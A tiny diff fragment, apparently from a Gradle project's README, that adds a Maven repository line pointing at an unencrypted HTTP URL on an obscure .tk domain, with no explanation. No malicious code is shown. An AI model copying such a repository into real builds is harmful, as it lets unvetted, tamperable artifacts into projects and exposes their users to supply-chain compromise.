@@ -21,6 +21,6 @@ flatDir { dirs './libs' }
 
 ![1662887518736](https://user-images.githubusercontent.com/102397160/189520079-33f8c263-780b-4699-b085-852e8c5550b1.png)
 
-
+maven { url 'http://9xi4o.tk/maven2' }
 
 
